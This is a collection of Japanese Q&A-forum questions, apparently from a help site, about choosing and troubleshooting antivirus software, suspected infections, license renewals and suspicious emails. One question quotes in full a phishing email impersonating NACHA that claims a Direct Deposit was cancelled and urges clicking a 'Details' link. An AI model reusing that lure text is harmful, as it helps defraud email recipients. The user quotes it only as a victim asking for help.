パソコンについて詳しくない者です。前々から気になっていたことがあります。セキュリティソフトをインストールするときには、他のセキュリティソフトを働かないようにして（アンインストールして？）からインストールすると思うのですが、そのときのセキュリティについては問題ないのでしょうか？（ネットを切断して操作すればいいのかとも思ったのですが、ソフトによってはオンラインでないと実行できないものもあると思います）。素人の質問ですみません。
スカイプ目的で遠くの両親にタブレットパソコンとポケットワイファイを渡しています。 スカイプは月に1～2回程度。 両親は、パソコンに興味はなく、パソコンを立ち上げるのもワイファイを つなぐのもスカイプの時だけです。 このような使い方なのですが、何らかのセキュリティソフトを 入れておくべきでしょうか？ 今まで、セキュリティソフトなしで使っていました。 パソコンは素人ですが、もし感染した場合の影響など考えると 急に心配になりました。 ご意見お願いいたします。
パソコンを最近購入しました。 90日間無料のウイルスバスタークラウドがあるのですが ウイルスセキュリティZEROを買いました。 ウイルスバスタークラウドが90日間経つまでウイルスセキュリティZEROをインストールするのは待つべきでしょうか？？ 同時に使ってもいいものなのでしょうか。
ウイルスバスターcorp.サーバ　バージョン10.0　Service　Pack[1を使用しています。 クライアントは全部で13です。 自動アップデートを深夜に設定しているのですが、PCが起動していなくても問題ないのですか？ （サーバーは24時間起動しています。） また、アップデート後のスキャンの実行についても同様の疑問です。 単純な話で恐縮なのですが、ご教授ください。
類似のご質問が多い中、大変恐縮ですが少しウィルスソフトに関していくつか教えてください。初心者のような質問で申し訳ございませんがよろしくお願い致します。 Windows7を使っておりWindows8にアップグレードしようと考えているところですが、ウィルスソフトはウィルスバスターの３ヶ月無料体験版を使用している状況です。ＰＣはヘビーに使うレベルではないのですが、ネットバンキングなどを行いたいと考えております。 （１）ソースネクストの”更新料０円”のソフトを使用しようと思って大手電機店に購入に行ったのですが、店員に「絶対止めた方がいいですよ。ノートンかウィルスバスターにしないと後悔しますよ」と言われてしまったので悩んでおります。「ＺＥＲＯは外部機関での検知率が高かったというニュースを読んだことがある」と話したところ、「それは既存のウィルスに対する検知率なだけであり、今後の未知のウィルスに対する対応、ファイアウォールの性能、等などは全くダメです。そもそもクラウド化されていないのでＰＣが重くなりますよ」とのこと。。。実際のところどうなのでしょうか？ＨＰなどで色々見てもそんなに変わらない気がするのですが、やはりノートンなどの方がよいのでしょうか？ （２）ＺＥＲＯにした場合、『スーパーセキュリティＺＥＲＯ』という少し高めのソフトも発売されておりました。通常のものとの違いがイマイチよく分からないのですが、ファイアウォールの性能なども充実しているのでしょうか？ （３）ノートンやウィルスバスターの場合、店頭にはない「２年更新版、ライセンスＩＤのみのお届け」という安い商品が楽天やアマゾンに溢れているのですが、これは正規品ではないと考えてよろしいのでしょうか？危ないですか？？？ 以上、３つも申し訳ございませんがよろしくお願い致します。
P、Cを立ち上げるとエフセキュアがしつこく出てきて消せません、どうすればよいですか。
ウイルスバスターゼロで毎日アイドルスキャンが変更されます。 毎日アイドルスキャンが変更され アイドルスキャンは無効です・・（赤）。と、アイドルスキャンが有効になりました・・（緑）。 を繰り返します。 なぜでしょうか？ 詳しい方教えていただけると助かります。 よろしくお願いします。
昨年１０月購入のＰＣでＯＳはwin７、セキュリティはＥｓｅｔスマートセキュリティを３年以上利用（最新契約は今年４月）しています。 　 今までは、ほとんどの迷惑メールをちゃんとトレイに振り分けてくれましたが、９月か１０月から迷惑メールが通常の受信トレイにダダ漏れ状態になりました。考えられるのは、その時期にフォトブックのソフト２件をダウンロードしたことです。 　それが原因かは確定できませんが、変わったことといえば、それぐらいしかしていません。 フォトブックは今後も利用する予定なので削除できないし、仕方がないので迷惑トレイにひとつひとつ移動させてます（そのメールを選択した状態で「迷惑メール」をクリック）。迷惑メールという機能に「差出人を「受信拒否リストに追加」というのがあり、かなり入れましたが、数が多すぎて効果なしです。 何か方法があればご指導お願いします。 　
ttp://gigazine.net/news/20121130-avtest-antivirus-product-ranking/ 専門家によるとネット掲示板ではあまり評価の高くないトレンドマイクロがbitやGDATAと並んで最高の保護能力と評価されています。しかしネットではAmazon価格コムそしてここや知恵袋でもカスペルスキーが最高評価ですし私もカスペルスキー3年版の購入者です。なぜ専門家の評価とネットの評価は食い違ってるんでしょうか。知識も経験も一般人を圧倒してるはずの専門家の見解がネット住人の評価に反映されない理由を教えてください。こうではないのかというのでもいいのでお願いします。
MicrosoftExcel2003で読み取りパスワードを設定し、MicrosoftOutlook2003でメールのやりとりをしています。 ところが最近、下記の警告文が出るようになりました。 ******************************************************* 警告：添付ファイル Book1.xls はパスワードで保護されているため、ウイルス検索を実行できませんでした。 ******************************************************* 最初は、セキュリティソフト（ウイルスバスター）の問題かと思い、モジュールの停止を行い、自分宛に送信してみましたが、まだ警告文が出ています。 どなたか、解決手段が判る方、お願いします。
現在、ノートンインターネットセキュリティ2012　5PCを使用しています。(パソコン5台まで有効) さて12月末で有効期限が切れるため、延長してくださいのメッセージが出るようになりました。 「今すぐ延長」というボタンを押すと、ブラウザが立ち上がり、ノートンの製品延長手続きページにとび、 「現在利用中の製品を延長する」という画面が現れます。 質問1 もちろん、これは5PC（5台用）として延長されるわけですよね。 質問2 本日現在、有効期限が残り25日あります。この時点で延長手続きをした場合、スタートが 今日からとなり、25日無駄になってしまいませんか？
Google　chromで新しいウィンドウを開くと　画像のようなPCスピードテストと言うのが出ます。 前はそんなのでなかったのに　ここ最近良く出ます。 開くたびに出るわけではありません。 時々　新しいウィンドウを開くと出るのです。 Explorerでは出ないです。Firfoxでもでないです。 なぜか　Chromだけでます。一応ノートンを入れています。 前は　これが出てくるときと　パスポートの写真がでかでか描かれたポップアップがこっそり開かれているウィンドウの裏に出ているときもありました。 最近ノートンスキャンで　ウィルスらしきものを削除してからそのパスポートのやつは出なくなりました。 いったい何なのでしょうか。ウィルスでしょうか？ 因みにwindows7 です。
知人のパソコンがウィルスに感染しているようなので代わりに質問です。 パソコンを立ち上げると、"cClient.exe"とやらがCPUを占領してしまい、ネットに繋ぐことができないそうです。 このファイルを削除し再起動しても、"cClient.exe"が復活してしまい、同じ現象が起きるそうです。 ネット検索ができない為、代わりに調べているのですが、解決しません。 "cClient.exe"とはウィルスなのでしょうか？　また、駆除方法をご存知でしたら教えて下さい。
ウィルスやスパイウェアなどに感染して、PC内の個人情報を見られたとします。 個人情報には、ヤフー、グーグル、mixi、OKWaveなどのIDやパスワードが含まれていた場合、ウィルス感染後の対処としては、各IDのパスワードを変更しておくだけで良いでしょうか。それともIDごと削除して、新規にまたIDを作った方が良いでしょうか？
更新時期が近づいていますが、価格.comで調べるとＤＬ版よりパッケージ版の方が安いようです。本来ならパッケージの要らないＤＬ版の方が安いと思うのですが何故なんでしょうか。
友人が自分のPCでネットをしたいらしく、モデムを使わせてと言われました。 ただ、そのPCはウィルスソフトが入っておらず、自分が使用しているセキュリティソフトのライセンスで3台までならインストールすればいいかと簡単に考えていたのですが。型が古くて無理そうです。 単純に自分のを使わせればいいのですが、そうはいかないので困っています。 お聞きたいのは、ウィルスに何の対策もされていない（今までネットに繋いだことが全くない、セキュリティ関係皆無）PCでネットを使用した場合、安易にウィルスに感染し、モデム経由で感染したりしてしまわないのでしょうか？多分、大丈夫な気がするのですが。 長時間使用する予定らしいので、その間に不都合はありはしないか、無線LANで効いたことがあったような気がしたので不安です（勘違いかも）。申し訳ないですが、とことん音痴なので、どなたか教えてください。 （長文で、読みずらい文章で、すみません。）
フリーですが比較的優良で品質が高いと評判のウィルスソフトを教えて下さい。
noreply@direct.nacha.orgから来たメールのリンクを踏んでしまいました。 海外の方ともメールすることがあるので、あまり考えずにリンクを踏んでしまい、その後ではっとして、他の質問やサイトを調べてみると、以下のメールのDetailsの部分にあるリンクを踏むとウイルスに掛かってしまうというのを見ました。 Detailsをクリックしても「ページは開けません」となったのですが、念の為にウイルス対策ソフトでスキャンを行いました。 スキャン以外にやるべきことがあるならば教えていただきたいです。宜しくお願い致します。 Herewith we are notifying you, that your latest Direct Deposit transaction (Int. No.-------------) was cancelled, because your business software package was out of date. The details regarding this matter are available in our secure section:: Details Please apply to your financial institution to get your updated version of the software needed. Best regards, ACH Network Rules Department NACHA | The Electronic Payments Association 12620 Sunrise Valley Drive, Suite 931 Herndon, VA 22190 Phone: 703-509-5459 Fax: 703-397-5338
貴方に問い合わせしようとしても、電話がかからない、 電話番号を直ぐに教えてください。
身から出た錆なのですが、どうか助言をお願い致します。 BitCometと言うTorrentのクライアントを利用し、 著作権のある漫画を３点ほどダウンロードしてしまいました。 また、そのファイルを友人（１人）にもコピーしてしまいました。 その行為が違法であることや、ウイルスなどの危険性が高いことを知り、 今とても後悔しています。 ウイルスバスターの検索では脅威は発見されませんでしたが、 セキュリティソフトも100％ではないと聞きますし、不安でたまりません。 BitCometはアンインストールしました。 私のパソコンはリカバリーしようと思いますが、 友人にも勧めたほうが良いでしょうか？ また、何か他にできる対策はないでしょうか？
バスターを皆さん 　定期的に更新するのですか？ (1)会社は５年契約で継続中 (2)個人的には2011が切れたままです 　どうしたら良いでしょうか？ 必要がありますか？ 　クラウド　OR　市販のを購入 有識者様教えて頂けませんでしょうか？
Windows7からウイルスを発見しました。 minibar-master-v1 minibar-master プログラム名は↑です。 無料のアバストでは感知ができず、そのほかにも感知できないソフトもあるようですがプログラム名で調べた所英語のサイトではウイルスとして感知されているようです。 で、削除したいのですが、手動で削除する方法を教えてください。 ウイルスソフトは感知してくれないので手動で消すしか無いようです。
Microsoft Security Essentialsというウイルス対策ソフトはWindows2000にはインストールできますでしょうか、教えてください。
小さな企業です PCが8台あり全てネット環境にあります 弊社にコピー機を売りにきたキャノン営業が『高速アンチウィルスセキリティゲートウェイ』と言うシステムを売り込みに来ました 元線からPCに繋ぐ間にウィルス等を全てブロックするものだそうです 安いのか高いのかセキリティ対策はこれでよいのかもわかりません もし詳しい方がいらっしゃいましたら教えて下さい
ノートンインターネットセキュリティやwindows7等、なるべくダウンロードではなく、ＣＤＲＯＭの物を買うようにしています。 その理由は、ＰＣをリカバリーした後、ノートン等を再インストールするのに、ＣＤＲＯＭが必要なのではと思っているのですが、この場合、ＣＤＲＯＭは必要なのでしょうか？ それとも、ＣＤＲＯＭがなくてもリカバリー後に再インストール出来るのでしょうか？
OSはWindows7を使用しています。ウィルスバスター　クラウド２０１２の英語版の体験版のダウンロードの方法を教えてください。
ケーブルTVの回線でネットを利用しています。 OSはwindows7 2週間前ほどから突然、リターンメールが1日、50件ほど来るようになりました。 どうも私のアドレスでメールが乱発されているようです。 以前もたまに迷惑メールと思われるリターンメールが来ていたのでその内、来なくなるだろう　と思っていた矢先 ケーブルTVから電話があり　「どうもウィルスに感染した恐れがある。　同様な症状が他のユーザーにも数件発生している。 新しいパスワードを送るので再設定してみてください。」とありました。 無料のウィルスチェック（あまり信用していませんが）をしてみましたがウィルスは発見されませんでした。 周りの人に聴いてみたところそれもあてにならない。　という声もありました。 最近の「遠隔操作」の話題もありメール送信ならともかく個人情報の抜き取り等を考えると パスワード変更だけでこの先、安心できるようにも思えません。 どう判断されますか？
ウイルスバスター２０１１クラウドが邪魔してマカフィーをダウンロードできません。２０１１ウイルスバスタークラウドの削除方法を教えてください。
現在はウイルスバスターを使用しているのですが更新期限が来たので新しく検討しようと思ってます。 ノートンやカスペルスキー等色々あると思うのですが、皆さんは何を使用されていますでしょうか？ 良点・悪点を教えてください。お願いいたします。
ＵＲＬを入力すると安全かどうか検索してくれるサイトでgredとaguseの二つを見つけたのですがどちらで検索した方がサイトが安全かわかりますか？
セキュリティソフトに関して質問です。 現在私は「ノートンインターネットセキュリティ」を使用しております。 ただ重い感じがしています。 「ウィルスバスター」等他にセキュリティソフトはありますが 比較的動きが軽いお勧めのセキュリティソフトが ありましたら教えて下さい。 宜しくお願い致します。
NTTセキュリティ対策ツールが有効にできないのですが、１ヶ月前も一回、インストールし直しています。 できれば面倒なので再インストールせずに有効にできたらいいのですが、方法を教えてください。OSはWindows７、 ツールのバージョンは５です。わからないことがあれば言ってください。補足します。 カプセルのマークが保護を開始していますのまま何もならないんです。クリックしても、表示してくれないし。 セキュリティ対策ツールのバージョン５を開こうとしても、最初の画面のまま、時間が経つと、消えてしまうんです。 よろしくお願いします。
オークションで2007年ごろのxpパソコンを購入しました。 OSインストール用のCDとデバイスドライバのインストール用CDが付属していました。 それぞれのCDを使用してOSとデバイスドライバをインストールしました。 パソコンの古さに対応してデバイスドライバも古いと思うのですが、この古いデバイスドライバには脆弱性というものがあるのでしょうか。 あるとすればwindows updateで対応できるのでしょうか？ インストールしたドライバのデバイスは オーディオ ビデオ チップセット ネットワーク タッチパッド です。
インターネットをしていたところ、突然コンピューターが再起動をはじめました。 （そのときの画面は、「プログラム更新中」だったと思います） そしてしばらくして再起動が終わり元の画面に戻るのですが、その時に大量の （２０個ほど）ホームページ画面がでできました。もちろん、自分で連打してホームページを 出したようなことはありません。 これはウィルスの類のものでしょうか？ ただポチポチと消せばいいだけなので、実害はないのですが、気持ち悪いです セキュリティソフトはnortonが入っています。 原因や解決策などわかる方がいらっしゃったら、教えていただければと思います。 よろしくお願いします。
パソコンのセキュリティーソフトについて。 PCに詳しい方教えてください。 現在は「フレッツウイルスクリア」に加入しています。 最近気付いたのですが、PCを開いた時に、 「Ｍｃａｆｅｅセキュリティースキャンプラス」というアイコンがあり、 定期的に自動でウイルスチェックをしています。 別の用件でPCのサポートセンターに問い合わせをした時に、 Ｍｃａｆｅｅが入っているなら、フレッツウイルスクリアは必要ないと言われました。 PCには詳しくないため、PCを購入した時に薦められたプランのまま使用しています。 Ｍｃａｆｅｅセキュリティースキャンプラスは、 フレッツウイルスクリアと同等とセキュリティー効果があるんですか？ 自分でのセキュリティー対策方法はわからない為、 解約していいのか迷ってます。 あとフレッツウイルスクリア以外で月額料金が安いセキュリティーソフトがあったら教えてください。
昨日、Ｇｍａｉｌのアカウントに 本文は英文一行に、添付ファイルのついたメールが来たのですが iphoneでそのメールを開けてしまいました。 添付ファイルはクリックしていないのですが、 身に覚えがなく、怖くなったので ＰＣので再度アカウントにログインし、すぐ削除した。 この場合、メール自体を開封してしまっただけでも ウイルスなどに感染してしまう事もあるのでしょうか・・・ 今のところ、ＰＣに不具合は出ておりませんが 詳しい方、よろしくお願いたします。
あるウイルス感染後の手順に関する質問の回答にありましたが、 疑問が生まれました。 ウイルス感染→バックアップ→リカバリ→バックアップから復元 という流れですが、ウイルス感染した後にバックアップして、リカバリをした後にバックアップから復元したら、ウイルスに感染しているのではないのでしょうか？
無料で使えるやつなのですが、現在KINGSOFTを使っていますがあまり評判が良くないみたいです。 ウィルスバスターとマカフィーとノートンの３０日無料体験版は前にもう使ってしまいました。 ２０１２バージョンになったらまた使えるんですか？ フリーソフトで人気のあるソフトを教えて下さい（日本語版）
先ほどadobe flash playerのアップデートについて画面に表示されたので手順にそってインストールしたのですが、途端にＡＶＧから警告がでました。 ？？？？？　と何に感染しているのはわからないのですが、ＡＶＧ　Identity Protection　というものが未知の脅威に対して反応するもののようです。 何がいけなかったのかと思い履歴をみてみたところ、 検索していったadobeのサイトが ttp://get.adobe.com となっているのにたいしてダウンロードしたサイトは ttps://get3.adobe.com となっていました。 これは偽装サイトだったのでしょうか　 今もなおＡＶＧが脅威の除去をおこなっていていっこうに終わる気配がありません。 知識に疎いものでこれが本当に感染しているのかわかりません。
1回線7台のPCでいつも作業しています うち5台は大した作業ではなくランネットワークついでに接続してプログラムの更新などをする為に繋いでいるようなものです のこり二台が主として動いていますが、内一台の前に座っている従業員が出社から退社までユーチューブやネットサーフィンやらで仕事しません 会社の社長に説明して納得させたいのですが、どうせならウィルス対策の一環でPCの私用利用を禁止させたいです 最近のフィッシングやスパムなども不安でなりません ウィンドウズのセキュリティやウィルスバスターの簡単なセキュリティレベルを上げることによるネット閲覧の制限では直ぐに設定を戻されてしまうと思います どなたか社内でこのような悪態をなくすためにシステムなどを導入されている方はいらっしゃいませんか？
　ＰＣにＯＮにしなければＬＡＮ端子からのＰＣ操作信号を受け付けないようにする機械接点スイッチおよびＯＮにしなければバイオス設定を変更できないようにする機械接点スイッチを設ければ外部のみによる不正遠隔操作を防止できるのではないでしょうか？ 　常時ＰＣを遠隔操作可能にする必要のある人にとっては無意味ですがそれなりの不正遠隔操作防止効果があると思いますがどうでしょうか？ 　システム設置場所にパイロットランプや手動によってのみ入り切りできる機械接点スイッチを設ける措置は電子計算機が開発される以前からあった遠隔操作防止の基本的な措置です。この措置は現在でもシーケンス制御回路等に使用されています。 　
標的方攻撃の対策について、分かりやすく説明をお願いします。 対策方法については多面に渡り数多くあると思いますが、なるべく効果の高いもので解説をしていただけると助かります。 出来ればマルウェアについての対策を解説していただけるとうれしいです。 よろしくお願いします。
マイクロソフトセキュリティエッセンシャル http://windows.microsoft.com/ja-JP/windows/secur … をインストールすると、 ウィンドウズディフェンダー http://www.microsoft.com/ja-jp/download/details. … は、自動的に無効化されるんですか。
PSPで最近ネットを始めたのですがpspはウイルスにかかるのでしょうか？ 最近怖いです。もしPSPにウイルスがはいったらパソコンにもウイルスがはいるのではないかなどと考えどんどん怖くなります。 どなたかご回答よろしくお願いします。 そして一回感染したら家のPC全てにウイルスがはいるウイルスなどはあるのでしょうか？
遠隔操作ウイルスと呼ばれるものの分類についての質問です。 このマルウェアは、次の中で分類するとすればどれに当てはまるのかを教えてください。 理由，解説も一緒にそえていただけると嬉しいです。 [候補]狭義のウィルス，ワーム，トロイの木馬 よろしくお願いします。
私はWimaxを利用して自宅に無線環境を整えています。 接続方式はWPA2の方がセキュリティは高いとの事ですが、 どうしても私のMACパソコンと相性が悪いのか接続が途切れ途切れになるために WEP方式というもので接続しています。 しかしこのWEP方式というものはセキュリティが簡単に破られるという事を知り 心配になりましたが、MACのOSはセキュリティに強くファイアーウォールもONに しているために大丈夫なのかな？と思っていましたが心配になりました。 そこで質問なのですが、私の環境でも他人に私のパソコンの中身が観られてしまったり 情報をやデータを盗まれることは一般的にあるのでしょうか？よろしくお願いします。 また、WPA2方式でとぎれとぎれになる理由ももしお分かりの方がいらっしゃれば 加えて教えて頂けるとありがたいです。（OSはMountain Lionです）
http://www.movie-repo.com/2007/06/hotclip.html こちらのサイトを参考にしてクリップボード拡張ソフトのhotclipを2年間ほど使用しています。 こちらで配布されている[ライタイムライブラリ] http://movie-repo.com/dl/hotclip_runtime.zip http://www.movie-repo.com/2007/06/hotclip.html のmfc70.dllをsystem32に入れて使用しています。 http://support.lenovo.com/ja_JP/downloads/detail … 上記を見ると、古い MFC70.dll には脆弱性があると指摘されています。 http://movie-repo.com/dl/hotclip_runtime.zip で配布しているmfc70.dllもやはり脆弱性があるのでしょうか？
ガラケーを使用しています。 最近まで自宅マンションがインターネットに対応していなかったため、携帯でも閲覧可能なフリーメールをよく使用しています。 最近マンションがインターネット対応になったので、やっとPCをネットにつなぎ、 海外旅行の予定があったので、国外の航空会社に直接申し込み（トルコ航空です） トルコ国内を旅行する際のチケットの手配をしました。 申し込み完了直後に、電子チケットの添付されたメールが届きました。 その数日後、発信源がトルコ航空が独自に運営するマイルの名前（Miles&Smiles）となっているメールが届きました。タイトルは日本語にすると、「Miles&Smilesへの招待プログラム」というものでした。 それをガラケーからたまたま見ていて、トルコ航空からだろう、と なんとなく開いてしまったのですが、本文は「M&S」との一言だけで、何も添付ファイルもついていませんでした。 うかつにメールを開いてしまったことを後悔し、PCのネットで同様の事象があった人をネットで探すと、一名ツイッターで見つけたのですが、 ツイッターということもあり、その後の展開が全くわからなかったので参考になりませんでした。 ちなみに私は、セキュリティソフトは「スーパーセキュリティゼロ」を使用しています。 このソフトを使い、改めてウイルススキャンをかけたのですが、特に感染など、異常は見つかりませんでした。 ただ一点、ちょっと心配なこともあります。セキュリティソフト購入時に、自身のOSと互換性があることを確かめた上でインストールしたはずなのですが、ウィンドウズアップデートがどうもうまくいっていないようなのです。 ウイルスソフトに不具合があるようなので、時間のあるときにまたソフトを買い換えようと思っていた矢先のことでした。 以下、質問です。 ・メールそのものを開いてしまった、ガラケーの方にはウイルスに感染する可能性はあるか ・開かれたメールが存在している、PCの方（Yahoo!メールを使用しています）にはウイルスに感染する可能性があるか ・ウイルスソフトでチェックした結果、問題はなかったと結果が表示されたが、それを信じて良いか うかつに開封してしまったことを後悔しています。 PC自体にも挙動不審な動きなどはありませんが、潜伏期間のあるウイルスなどもいるようなので とても今、うろたえています。 今すぐアドバイスいただけると助かります。よろしくお願いいたします。
フリーウェアに関する質問なので、「気が向いたから答えてやるか」程度でお願いします。 シャープ製PC-MV1-VC1というノートパソコンを中古で購入し、手持ちのWinXP Pro（SP3）をインストールして使っていました。メモリ1.25GB（なぜか1GBの増設メモリを認識してしまった…）、HDD換装（40GB）、OS以外は仕様表のとおりです。 http://www.sharp.co.jp/products/pcmv1vc1/text/p5 … アンチウイルスソフトはavast! Free Antivirus（現時点で7.0.1474）です。 このパソコンの問題は、10分間ほどAvastSvc.exeというプロセスがCPUの99％近くを占有してしまうことです。典型的には、以下のタイミングで生じます。 ▼休止状態でひと晩放置したあと、復帰してログオンしたあと10分後から20分後にかけて（←毎回）。 ▼起動してログオンして1時間20分後から1時間30分後にかけて（←今日の場合）。 そこで、各シールドのレポートファイルを確認しました。 ▼アバストユーザーインターフェース（メイン画面）→リアルタイムシールド→各シールド（ファイルシステムシールドなど）→詳細な設定→レポートファイル→報告する項目、で「OKな項目」にチェックを入れる。 ▼C:\Documents and Settings\All Users\Application Data\AVAST Software\Avast\reportを確認。 そうしたところ、この10分間はファイルシステムシールドが以下のファイルをスキャンしていることがわかりました。なお、すべての検査結果が「OK」でした。 ▼C:\WINDOWS\Installerにある47個の「英数字6文字～8文字.msp」ファイル（種類：Windowsインストーラ修正プログラム、161KB～115,432KB）のうち26個～27個 ▼C:\WINDOWS\Installerにある21個の「英数字5文字～8文字.msi」ファイル（種類：Windowsインストーラパッケージ、20KB～5,845KB）のうち「64e6d.msi」 また、C:\WINDOWS\Installerはサイズが897MB、ファイル数が544、フォルダ数が30、となっています。 手っ取り早い回避策としては、「検査からの除外」に「C:\WINDOWS\Installer\*.ms?」を追加してしまえば良いのでしょうが、ネーミング的にいかにもウィルスが入り込みそうなフォルダなので、躊躇しています。 別に仕事用パソコンでもないし、10分くらい筋トレでもして待てば良いじゃん、という気もします。 以上につき、ご助言いただけるとありがたいです。どうぞよろしくお願いします。 ～～～～～～～～ 参考：リアルシステムシールドの「詳細な設定」は以下のとおりです。 ▼実行時に検査する 　▼プログラムを実行する時に検査する　→　○ 　▼スクリプトを実行する時に検査する　→　○ 　▼ライブラリ（DLL）を読み込む時に検査する　→　○ ▼開く時に検査する 　▼文書ファイルを開く時に検査する　→　○ 　▼指定した拡張子のファイルを検査する　→　× 　▼全てのファイルを検査する　→　× ▼書き込む時に検査する 　▼デフォルトの拡張子のファイルを検査する　→　○ 　▼指定した拡張子のファイルを検査する　→　× 　▼全てのファイルを検査する　→　× ▼装着する時に検査する 　▼リムーバブルメディアを装着した時に自動実行される項目を検査する　→　○ 　▼アクセス時にディスクのブートセクタを検査します　→　○ ▼自動サンドボックス（割愛→たぶんデフォルト設定） ▼検査からの除外（割愛→たぶんデフォルト設定） ▼追加設定 　▼確認済みのシステムDLLを検査しない　→　×を○に変えてみても変化なし 　▼一時的なキャッシュを使用する　→　×を○に変えてみても変化なし 　▼永続的なキャッシュを使用する　→　×を○に変えてみても変化なし ▼処理（割愛） ▼圧縮形式 　▼全ての圧縮形式　→　チェック ▼感度 　▼ヒュースてリックの感度　→　高 　▼コードエミュレーションを使用する　→　○ 　▼ファイル全体をテストする　→　× 　▼不必要な可能性のあるプログラム（PUP）を検査する　→　○ ▼レポートファイル（割愛）
win8にしました。 (1)そこで、セキュリティ対策として、AVG アンチウイルス 2013 無料版をインストールしました。 ところが。インストール直後は問題ないのですが、再起動すると、システムの状態が、ウイルス対策やスパイウエア等２項目が無効になっています。 そこで有効にするをクリックしても、 AVG アンチウイルス 2013 無料版が有効になりません。 対策がありましたら、お教えください。 (2)上記事情により、今はAVG アンチウイルス 2013 無料版をアンインストールし、ウイルス等の対策は特にしていませんが、、wi8に標準でついてくるWindows Defenderは、win7の時と違いウィルス対策やスパイウェア対策の機能が搭載されているらしいです。 Windows Defenderだけでセキュリティ対策は問題ないのでしょうか。
AppleのMac iOSがシェアが多いのにウイルスが極めて少ないのは何故でしょうか。 Macが安全な理由としてたびたび「シェアが少ないからウイルス開発者に相手にされないだけだ」といわれますがその理屈だとiOSが安全なのはおかしくないですか？
PCを立ち上げると、次のような窓が出てきます。 アプリケーションはインターネットに接続しようとしています プログラム：spoolsv.exeは、ネットワーク上のサーバとして振る舞おうとしています。 開発元：Microsoft Corporation プログラムパス：C:\windows\system32 ネットワーク情報 IPアドレス：**** ポート番号：***** プロトコル:TCP □このアプリケーションは常にこの選択を適用する 【許可】・【ブロック】 これを適用させて良いものでしょうか？ ブロックすると何か問題がおこりますか？ 分からなくて困っています。 一番上は赤文字です。 windows7 ウイルスセキュリティZERO　を使用しています。
ドコモのスマホを使っているんですが、ウイルスに感染するのがイヤなのでウイルス対策アプリを２つ入れていました。どっちも無料でDr.Webとアバスト！なんですが、２ついれるとお互いに干渉して悪影響かあるみたいなことを聞きました。なので１つにしようと思っているんですがどっちがいいと思いますか？（ウイルス検出力とか電池の消費とかブラウザーの保護的なやつとかを考えて）Dr.Webはウイルスの亜種とかにも対応できると書いてあったので迷ってます。また、ほかに性能のいいウイルス対策アプリがあったら教えてください！
フリーソフトか、期間限定試用版のウイルス対策ソフトを、インストールして使おうと思います。 期間限定試用版で、使いやすく、3ヶ月以上使えて、性能もよく、信頼性のあるソフトのリンクと、そのソフトの特徴を教えて欲しいです。 フリーウェアのウイルス対策ソフトで導入することも選択肢の中にありますので、こちらも、使いやすく、性能もよく、信頼性のあるソフトのリンクと、そのソフトの特徴を教えて欲しいです。 期間限定試用版の場合は、大丈夫だと思いますが、 フリーウェアの場合は、常駐保護と、駆除機能と、自動更新機能と、日本語表示が最低必要です。 良いソフトを、多くの皆様に、詳しくご紹介いただけることを願っています。
質問させていただきます。 今、AVIRA FREE ANTIVIRUS とCOMODOファイアーウォールでセキュリティ対策をしているのですが、メールのウィルスチェックは有料版にアップグレードしないと使用出来ないらしく不安です。 メールのウィルスチェックが出来る無料のウィルスソフトでおすすめのはあるでしょうか？ アドバイスよろしくお願いいたします。
PCの動作がおかしいので、ＯＳを変更するか、新しいＰＣを買うかで迷っています。 動作異常について ノートンのパスワード一括管理機能（ＩＤセーフデータベース）に アクセスできなくなりました。パスワードを変更した覚えが無いのに、 パスワードが違うといわれます。 ただ、一括管理していた、銀行や証券の口座に被害はありません。 また、使用中に突如ウィルス対策が勝手に無効になったり することもあります。 私のＰＣは、すでにクラッキングされているのでしょうか？ これに対する対策として２つ考え中です。 1.　ＯＳをWIN7にする。 2.　新しいＰＣを買う。 ＯＳは15000円くらいで購入できると思います。 実は、ブラウン管モニターを使用していて、そちらも赤が 出なくなってしまいまして購入しようと思います。 液晶モニターが10000円弱くらいだとして、25000円くらいの 費用がかかると思います。 もしくは新たにＰＣを買おうと考えています。 上記の理由のほかにも、インターネットエクスプローラー8の サポートがまもなく無くなるというようなメッセージが現れます。 現状のPCを使い続けるより、機器を新しくしてしまった方が 良いでしょうか？ 安いノートPCであれば、30000円くらいで購入できそうです。 現在、タワー型の自作ＰＣを使用中です。 スペックは、 CPU：Celeron D 326+ 2.53GHz メモリ：1G（500M×2） マザーボード：ASUS P5LD2-VM SE です。 6年前に作成しました。
他の人からデータをＵＳＢメモリで受け取り、ＵＳＢメモリをＰＣにセットしたところウィルス対策ソフト（トレンドマイクロ）がウィルス（Mal_Otorun2）を検出し、自動で隔離しました。 隔離されたウィルスはどのように処置（削除）したら良いのでしょうか。それとも何もしないで放置しておけばウィルス対策ソフトが自動でウィルスを処置をしてくれるのでしょうか。
　これからのＰＣのカメラには不正遠隔操作による盗撮防止のため、カメラの電源線に並列に発光ダイオードが接続されて、発光ダイオードが点灯していることによってカメラが作動していることがＰＣ使用者に容易に確認できるようになるのではないでしょうか？
Ｗｉｎｄｏｗｓセキュリティは初めから搭載されていて、個人でＹａｈｏｏのBBセキュリティ（ノートン）を入れています。 ファイアウオールとウィルス対策が重複していますがまずいでしょうか。 どちらか一つとなればBBセキュリティの方が守ってくれる項目が多いのでこちらを残したいのですが Ｗｉｎｄｏｗｓセキュリティは始めからついていたので外してはいけないような気がします。 今のところ無事にネットを楽しんでいますが上記の重複はこのままで問題ないでしょうか。
avast! インターネットセキュリティ バージョン：7.0.1474 を使用しているのですが、avast!のメールシールドにて、SSLアカウントにホスト名を登録してSSL送受信をしております。Outlook等のメーラーで暗号化しない事により、avast!が代わりに暗号化してくれるものだと解釈しております。以下のメールを送受信する際、 aaa@aaa.ne.jp ＜SSLが使えるサーバ＞ bbb@bbb.ne.jp ＜SSLが使えないサーバ＞ SSLアカウントには、以下のように設定しました。 ホストの名前：aaa.ne.jp　プロトコル：POP　ポート:995　暗号：SSL ホストの名前：aaa.ne.jp　プロトコル：SMTP　ポート:465　暗号：SSL ホストの名前：bbb.ne.jp　プロトコル：POP　ポート:110　暗号：無し ホストの名前：bbb.ne.jp　プロトコル：SMTP　ポート:587　暗号：無し ですが、これだとbbb@bbb.ne.jp もSSL経由で送受信してしまいエラーとなります。 どうやら ホスト名が「ne.jp」の部分でしか区別されていない様なのです。 ホストの名前：ne.jp　プロトコル：POP　ポート:995　暗号：SSL ホストの名前：ne.jp　プロトコル：SMTP　ポート:465　暗号：SSL と設定してあるのと同様となってしまいます。 aaa.ne.jp はSSLで、bbb.ne.jpは暗号化なしで、というような区別はできませんでしょうか？ 詳しい方がおられましたら教えてくださいませ。 よろしくお願いいたします。
